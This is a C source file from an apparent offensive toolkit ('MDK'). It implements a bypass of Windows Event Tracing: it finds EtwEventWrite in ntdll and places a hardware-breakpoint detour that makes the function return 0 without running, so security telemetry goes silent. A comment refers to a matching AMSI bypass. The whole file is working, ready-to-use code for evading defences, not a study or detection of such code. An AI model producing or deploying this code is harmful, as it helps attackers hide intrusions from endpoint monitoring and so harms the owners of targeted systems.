// MDK
// docs    : https://sebafvs.com/mdk/etw
// author  : @sebafvs

#include <windows.h>
#include "mdk/result.h"
#include "mdk/hwbp.h"
#include "mdk/etw.h"
#include "mdk/nt.h"

static PVOID _g_etw_event_write = NULL;
static volatile LONG _g_hits    = 0;

// --- Detour ---

static void _etw_detour(PCONTEXT ctx) {
    InterlockedIncrement(&_g_hits);

    mdk_hwbp_return_value(ctx, 0);
    mdk_hwbp_block_real  (ctx);
    mdk_hwbp_continue    (ctx);
}

// --- Private helpers ---

static MDK_RESULT _resolve(void) {
    if (_g_etw_event_write != NULL) {
        return MDK_MAKE_OK();
    }

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll == NULL) {
        return MDK_MAKE_FAIL("mdk_etw:GetModuleHandle(ntdll)", MDK_STATUS_DLL_NOT_FOUND);
    }

    PVOID address = (PVOID)GetProcAddress(ntdll, "EtwEventWrite");
    if (address == NULL) {
        return MDK_MAKE_FAIL("mdk_etw:GetProcAddress(EtwEventWrite)", MDK_STATUS_ENTRYPOINT_NOT_FOUND);
    }

    _g_etw_event_write = address;
    return MDK_MAKE_OK();
}

// --- Public API ---

MDK_RESULT mdk_etw_event_write_addr(OUT PVOID* address) {
    MDK_CHECK(_resolve());
    *address = _g_etw_event_write;
    return MDK_MAKE_OK();
}

MDK_RESULT mdk_etw_bypass_install(IN MDK_DRX drx, IN DWORD thread_id) {
    MDK_CHECK(_resolve());
    InterlockedExchange(&_g_hits, 0);
    return mdk_hwbp_install(_g_etw_event_write, drx, _etw_detour, thread_id);
}

MDK_RESULT mdk_etw_bypass_remove(void) {
    if (_g_etw_event_write == NULL) {
        return MDK_MAKE_FAIL("mdk_etw_bypass_remove:not-installed", MDK_STATUS_NOT_FOUND);
    }
    // See comment in amsi.c:mdk_amsi_bypass_remove.
    MDK_RESULT r = mdk_hwbp_remove(_g_etw_event_write, GetCurrentThreadId());
    if (MDK_OK(r)) { return r; }
    return mdk_hwbp_remove(_g_etw_event_write, MDK_HWBP_ALL_THREADS);
}

LONG mdk_etw_bypass_hits(void) {
    return _g_hits;
}
